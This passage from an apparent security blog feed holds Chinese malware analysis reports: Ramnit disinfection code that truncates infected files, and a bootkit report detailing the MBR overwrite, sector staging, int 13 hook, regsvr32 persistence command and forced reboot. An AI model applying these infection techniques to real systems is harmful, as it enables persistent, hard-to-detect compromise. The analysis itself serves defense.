class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Ramnit.X，AS 变种的OEP</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetOEP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line">DWORD median;</span><br><span class="line">DWORD RAW;</span><br><span class="line"></span><br><span class="line">RAW = sectionHeader[numOfSection - <span class="number">1</span>].PointerToRawData;</span><br><span class="line">median = *(PDWORD)((PBYTE)dosHeader + RAW + <span class="number">0x328</span>);</span><br><span class="line">OEP = optionalHeader-&gt;AddressOfEntryPoint - median;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|成功获取到原始OEP：%x\n&quot;</span>,OEP);</span><br><span class="line">&#125;</span><br><span class="line">Ramnit.A变种的OEP</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GetOEP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line">DWORD median;</span><br><span class="line">DWORD RAW;</span><br><span class="line"></span><br><span class="line">RAW = sectionHeader[numOfSection - <span class="number">1</span>].PointerToRawData;</span><br><span class="line">median = *(PDWORD)((PBYTE)dosHeader + RAW +  <span class="number">0x771</span>);</span><br><span class="line">OEP = optionalHeader-&gt;AddressOfEntryPoint - median;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|成功获取到原始OEP：%x\n&quot;</span>,OEP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置感染标记"><a href="#设置感染标记" class="headerlink" title="设置感染标记"></a>设置感染标记</h3><p>对于<code>Ramnit.A</code>变种，在文件末尾添加任意被感染文件末尾24字节的感染标记即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EF DA DA 59 BD 19 C1 A3 EA DA DA 59 EF DA DA 59 E2 DA DA 59 3D EF 0C 15 65 9B 0F 04 8D D4 DF 59 EA DA DA 59</span><br></pre></td></tr></table></figure><p>对于<code>Ramnit.X，AS 变种</code>，添加.rmnet节表</p><h3 id="删除感染节表"><a href="#删除感染节表" class="headerlink" title="删除感染节表"></a>删除感染节表</h3><p>删除感染节表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除感染节表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FixSection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//删除多余节表数据</span></span><br><span class="line">optionalHeader-&gt;SizeOfImage -= sectionHeader[numOfSection - <span class="number">1</span>].Misc.VirtualSize;  <span class="comment">//修正sizeofimage  </span></span><br><span class="line"><span class="built_in">memset</span>(sectionHeader[numOfSection - <span class="number">1</span>].PointerToRawData + (PBYTE)dosHeader, <span class="number">0</span>,  sectionHeader[numOfSection - <span class="number">1</span>].SizeOfRawData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修正DOS头</span></span><br><span class="line">fileHeader-&gt;NumberOfSections--;<span class="comment">//节表个数-1</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;sectionHeader[numOfSection - <span class="number">1</span>], <span class="number">0</span>, <span class="number">0x28</span>);<span class="comment">//将最后一个节的数据全置0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;|成功修复多余节表！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除感染数据"><a href="#删除感染数据" class="headerlink" title="删除感染数据"></a>删除感染数据</h3><h4 id="删除感染PE数据"><a href="#删除感染PE数据" class="headerlink" title="删除感染PE数据"></a>删除感染PE数据</h4><p><code>Ramnit.A</code>变种和<code>Ramnit.X，AS 变种</code>删除.exe和.dll文件都可用如下方法删除感染数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deldata</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">           DWORD Distance = (sectionHeader[numOfSection - <span class="number">2</span>].SizeOfRawData + sectionHeader[numOfSection - <span class="number">2</span>].PointerToRawData);</span><br><span class="line">HANDLE hFile1 = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">SetFilePointer(hFile1, Distance, <span class="number">0</span>, FILE_BEGIN);</span><br><span class="line">SetEndOfFile(hFile1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除感染网页数据"><a href="#删除感染网页数据" class="headerlink" title="删除感染网页数据"></a>删除感染网页数据</h4><p>删除网页的感染数据稍微不同，因为<code>Ramnit.A</code>变种网页数据后面还有随机长度的密钥以及感染标志，因此删除网页感染数据代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修复Ramnit.A</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">repairHtml2</span><span class="params">(<span class="keyword">char</span> filepath[MAX_PATH])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> Buffer[<span class="number">600</span>];</span><br><span class="line">HANDLE hfile;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">SetFileAttributesA(filepath, FILE_ATTRIBUTE_NORMAL);</span><br><span class="line">hfile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hfile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD filesize = GetFileSize(hfile, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (filesize != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">SetFilePointer(hfile, filesize - <span class="number">539</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//539为附加随机数据的最大长度</span></span><br><span class="line">ReadFile(hfile, Buffer, <span class="number">539</span>, &amp;NumberOfBytesRead, <span class="number">0</span>);<span class="comment">//读取文件末尾539字节的数据到buffer中</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> strcharacteristic[<span class="number">20</span>] = <span class="string">&quot;&lt;/SCRIPT&gt;&lt;!--&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>* ret = <span class="built_in">strstr</span>(Buffer, strcharacteristic);</span><br><span class="line">DWORD Distance = filesize - (<span class="number">262630</span> + (<span class="number">539</span> - (ret - Buffer) - <span class="number">13</span>));</span><br><span class="line">SetFilePointer(hfile, Distance, <span class="number">0</span>, FILE_BEGIN);</span><br><span class="line">SetEndOfFile(hfile);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">CloseHandle(hfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修复Ramnit.X，AS 变种</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">repairHtml1</span><span class="params">(<span class="keyword">char</span> filepath[MAX_PATH])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> Buffer[<span class="number">20</span>];</span><br><span class="line">HANDLE hfile;</span><br><span class="line">DWORD NumberOfBytesRead;</span><br><span class="line">SetFileAttributesA(filepath, FILE_ATTRIBUTE_NORMAL);</span><br><span class="line">hfile = CreateFileA(filepath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hfile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">DWORD filesize = GetFileSize(hfile, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (filesize != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">SetFilePointer(hfile, filesize - <span class="number">280034</span>, <span class="number">0</span>, FILE_BEGIN);</span><br><span class="line">SetEndOfFile(hfile);</span><br><span class="line">CloseHandle(hfile);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> Ramnit </tag>
            
            <tag> Virus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MBR感染病毒分析报告</title>
      <link href="2019/10/30/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2019/10/30/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size = 8><b>MBR感染病毒分析报告</b></font></center><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">样本名称</th><th align="center">1.exe11.vir</th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>MBR感染型病毒</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>236 KB (242,176 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>8cfa512ba62399f135c03505a93533f3</strong></td></tr></tbody></table><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该样本为MBR感染型病毒，其通过修改原始MBR，从而实现在开机运行操作系统之前，执行修改后的MBR中的指令，其对系统进行了3次Hook，最终再开始时加载其写入的驱动文件来实施攻击。经过分析该样本只针对于XP操作系统进行攻击，攻击手段十分隐蔽，并且攻击十分底层，一般情况下很难发现该恶意样本的恶意源头。</p></blockquote><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/08_MBR%E6%84%9F%E6%9F%93%E6%80%A7%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.png" alt="08_MBR感染性病毒分析报告"></p><h1 id="简单行为分析"><a href="#简单行为分析" class="headerlink" title="简单行为分析"></a>简单行为分析</h1><h2 id="文件写入行为"><a href="#文件写入行为" class="headerlink" title="文件写入行为"></a>文件写入行为</h2><p>运行样本后，该样本进行了3次文件写入行为，分别为：</p><ul><li><p>1.往磁盘DR0中写入数据；</p></li><li><p>2.在样本目录中释放与样本同名的dll文件；</p></li><li><p>3.在临时目录中写入临时文件<code>00000218.tmp</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028110112117.png" alt="image-20191028110112117"></p><center>图1</center>## 注册系统服务<p>运行样本后，该样本通过调用<code>regsvr32.exe</code>，将释放出来的样本同名的dll文件注册为系统服务。执行的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;s &quot;C:\Documents and Settings\Administrator\桌面\8cfa512ba62399f135c03505a93533f3_1.dll&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028110816898.png" alt="image-20191028110816898"></p><center>图2</center># 样本详细分析<h2 id="分析样本文件本身"><a href="#分析样本文件本身" class="headerlink" title="分析样本文件本身"></a>分析样本文件本身</h2><p>首先通过查壳工具，发现该样本文件是<code>ASPack</code>壳，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028111357118.png" alt="image-20191028111357118"></p><p>然后通过ESP定律将其脱去。脱壳中值得注意的是，该样本有2层<code>ASPack</code>壳，脱壳时需要脱两次。</p><p><strong>然后将其拖入IDA和OD中分析，该样本主要行为有：</strong></p><ul><li>往临时文件<code>C:\Windows\temp\00000218.tmp</code>中，写入执行日志。</li><li>将控制代码<code>IOCTL_VOLUME_LOGICAL_TO_PHYSICAL</code>发送到\\.\C:，来获取物理磁盘号和物理偏移量相对应的逻辑偏移量。 </li><li>然后根据内存地址<code>MEMORY[0x7FFE0500] </code>中的值是否等于0xEE00A121，来判断当前操作系统是否已经被感染，若被感染执行相应操作。</li><li>创建互斥体==Global\7BC8413E-DEF5-4BF6-9530-9EAD7F45338B==。</li><li>修改MBR中的数据，并将原始MBR数据存储在62扇区中。另外还从当前文件中读取两个512字节的数据写入到60和61扇区中，还写入了一个PE文件。</li><li>重启后删除自身文件，拷贝自身文件到当前目录，并伪装成一个dll文件。然后再将该dll文件注册为系统服务。</li><li>强制重启计算机。从而执行感染后的MBR。</li></ul><p><strong>主函数代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028132331860.png" alt="image-20191028132331860"></p><h3 id="写入执行日志"><a href="#写入执行日志" class="headerlink" title="写入执行日志"></a>写入执行日志</h3><p>通过调用函数<code>WriteFile_401B81</code>，将传进来的记录日志的字符串，写入”C:\Windows\temp\00000218.tmp”文件中。从而记录该样本执行过程的相关日志，函数<code>WriteFile_401B81</code>代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028133224104.png" alt="image-20191028133224104"></p><h3 id="获取逻辑偏移量"><a href="#获取逻辑偏移量" class="headerlink" title="获取逻辑偏移量"></a>获取逻辑偏移量</h3><p>通过调用函数<code>DeviceIoControl</code>，将控制代码<code>IOCTL_VOLUME_LOGICAL_TO_PHYSICAL</code>发送到\\.\C:中，从而来获取物理磁盘号和物理偏移量相对应的==逻辑偏移量==。 其中函数<code>DeviceIoControl_402BF9</code>代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028133729406.png" alt="image-20191028133729406"></p><h3 id="判断是否被感染"><a href="#判断是否被感染" class="headerlink" title="判断是否被感染"></a>判断是否被感染</h3><p>根据内存地址<code>MEMORY[0x7FFE0500] </code>中的值是否等于0xEE00A121，来进行判断当前操作系统是否已经被感染，若被感染执行相应操作。感染前改地址处的值为0，当被感染后改地址的值将被置为0xEE00A121，然后根据判断结果执行不同的操作，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028134719868.png" alt="image-20191028134719868"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>通过调用函数<code>CreateMutex_402B93</code>，来进行判断互斥体”Global\7BC8413E-DEF5-4BF6-9530-9EAD7F45338B”是否存在，若不存在则创建该互斥体，若存在直接退出当前进程。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028134830359.png" alt="image-20191028134830359"></p><h3 id="修改MBR往扇区中写入数据"><a href="#修改MBR往扇区中写入数据" class="headerlink" title="修改MBR往扇区中写入数据"></a>修改MBR往扇区中写入数据</h3><p>通过调用函数<code>AlterMBR_402407</code>，修改原始MBR中的数据，并将原始MBR数据存储在62扇区中。另外还从当前文件中读取两个512字节的数据写入到60和61扇区中。</p><p><strong>读取原始MBR</strong></p><p>先通过函数<code>CreateFileA</code>，获取\.\physicalDrive0文件的句柄hDevice。</p><p>再通过调用函数<code>DeviceIoControl</code>，来检索有关物理磁盘的信息，然后再从DR0中偏移00位置处读取<code>原始MBR</code>到指定Buffer_init00MBR中。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028140620390.png" alt="image-20191028140620390"></p><p><strong>写入数据</strong></p><p>然后连续调用5次<code>WriteFile</code>，分别写入：</p><ul><li>往偏移<code>0xE0FFF00000</code>处，写入大小为0x3BC00大小的PE文件</li><li>往偏移<code>0x7800（60扇区）</code>处，写入大小为512字节的数据</li><li>往偏移<code>0x7A00（61扇区）</code>处，写入经过修改的大小为512字节的数据</li><li>往偏移<code>0x7C00（62扇区）</code>处，写入之前读取到的原始MBR数据</li><li>往偏移为<code>0x0（MBR）</code>处，写入修改后的MBR数据，从而实现感染MBR</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028142205471.png" alt="image-20191028142205471"></p><h3 id="拷贝自身文件并注册系统服务"><a href="#拷贝自身文件并注册系统服务" class="headerlink" title="拷贝自身文件并注册系统服务"></a>拷贝自身文件并注册系统服务</h3><ul><li>通过调用函数<code>MoveFileExA</code>将自身文件拷贝到当前目录，并将文件后缀名重命名为.dll，然后设置参数为<code>MOVEFILE_DELAY_UNTIL_REBOOT</code>，重启后删除自身文件。</li><li>通过调用函数<code>AlterCharacteristic_403422</code>修改复制后的.dll文件的<code>characteristics</code>，来将该EXE文件的属性修改为DLL文件</li><li>通过函数<code>CreateService_40316F</code>调用<code>regsvr32</code>，执行命令regsvr32 /s “C:\Users\<username>\Desktop\dump.dll”，来将复制后的dll文件注册为系统服务</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028145157927.png" alt="image-20191028145157927"></p><h3 id="强制重新启动"><a href="#强制重新启动" class="headerlink" title="强制重新启动"></a>强制重新启动</h3><p>先获取特权<code>SeShutdownPrivilege</code>，再调用函数<code>InitiateSystemShutdownA</code>，强制关闭应用程序，并重新启动本地计算机，从而执行感染后的MBR，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028145711134.png" alt="image-20191028145711134"></p><h2 id="分析修改后的MBR"><a href="#分析修改后的MBR" class="headerlink" title="分析修改后的MBR"></a>分析修改后的MBR</h2><p>首先修改虚拟机的<code>VMX</code>文件，再通过强大的IDA来调试虚拟机中的系统MBR。</p><p>并在MBR载入内存的地方==7C00==处下断，然后运行到此处。由于<code>MBR</code>是运行在==实模式==下的，所以这里还需要将IDA区段属性修改为16位汇编模式。然后就能看到==7C00==处解析出的16位汇编代码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1571824196358.png" alt="1571824196358"></p><p>修改后的MBR主要实现了功能有：</p><ul><li>申请2KB大小的内存空间，将修改后的<code>MBR数据</code>写入申请的内存空间中</li><li>读取60和61扇区中的数据到申请的内存空间中</li><li>Hook<code>int 13</code>中断表中的跳转的地址，将要跳转的地址修改为申请的内存空间</li><li>恢复原始MBR，通过调用被Hook的<code>int 13</code>，将磁盘62扇区中的原始MBR数据读取到内存0x7C00，再跳转到0x7C00执行原本MBR指令。</li></ul><h3 id="将修改后的MBR写入申请的内存空间中"><a href="#将修改后的MBR写入申请的内存空间中" class="headerlink" title="将修改后的MBR写入申请的内存空间中"></a>将修改后的MBR写入申请的内存空间中</h3><p><strong>申请内存空间</strong></p><p>偏移<code>[0x413]</code>中记录了bios内存可用区域，通过将偏移<code>[0X413]</code>的数值减2，来申请大小为2KB的内存空间，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1571837198321.png" alt="1571837198321"></p><p><strong>将修改后的MBR写入申请的内存空间中</strong></p><p>首先通过寄存器<code>ax</code>左移6位，计算出分配的内存的段起始地址。然后再将当前内存地址为<code>[0x7C00]</code>也就是当前执行的修改后的MBR指令，拷贝到分配的段起始位置<code>ES：00(9F000)</code>中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028162052653.png" alt="image-20191028162052653"></p><p>拷贝后内存地址<code>0x9F000</code>上的数据，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028162432362.png" alt="image-20191028162432362"></p><h3 id="读取60和61扇中的数据到申请的内存空间中"><a href="#读取60和61扇中的数据到申请的内存空间中" class="headerlink" title="读取60和61扇中的数据到申请的内存空间中"></a>读取60和61扇中的数据到申请的内存空间中</h3><p>通过调用<code>int 13h</code>中断，跳转到地址<code>ECBE2</code>执行指令，来读取磁盘==0磁道60扇区(7800)和61扇区(7A00)==大小为2个扇区的数据到<code>ES:BX(9F00:200)（9F200）</code>，紧挨着上一步写入的修改后的<code>MBR</code>数据后面。其中60和61扇区中的数据是之前分析过的样本==恶意写入磁盘中的两段数据==，汇编指 令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028163914300.png" alt="image-20191028163914300"></p><p><code>int 13</code>中断处的跳转的地址为<code>ECBE2</code>，跳到该地址查看汇编指令。由于此时的<code>int 13</code>中断表跳转的地址是由系统加载的，并没有被修改，所要执行的的指令都是正常的，因此这里也就不需要跟下去分析了，<code>ECBE2</code>汇编指令如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028165018664.png" alt="image-20191028165018664"></p><p>直接查看拷贝后的数据 ，查看申请的内存地址<code>0x9EE00</code>中存储的之前样本恶意写入==60和61扇区==中的数据，拷贝后内存地址<code>0x9EE00</code>上的数据如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/07_MBR%E6%84%9F%E6%9F%93%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20191028165823587.png" alt="image-20191028165823587"></p><p>此时内存空间中数据与样本写入磁盘的数据对应关系，如下表：</p><table><thead><tr><th align="left">开辟的内存地址</th><th align="left">数据来源</th></tr></thead><tbody><tr><td align="left">9F000</td><td align="left">修改后的MBR数据</td></tr><tr><td align="left">9F200</td><td align="left">样本写入磁盘60扇区中的数据</td></tr><tr><td align="left">9F400</td><td align="left">样本写入磁盘61扇区中的数据</td></tr></tbody></table><h3 id="Hook-int-13中断表"><a href="#Hook-int-13中断表" class="headerlink" title="Hook int 13中断表"></a>Hook int 13中断表</h3><p>Hook<code>int 13</code>中断表，修改<code>int 13</code>中断表中原本要跳转的地址<code>ECBE2</code>修改为申请的内存空间地址<code>9F066</code>，并将原本int 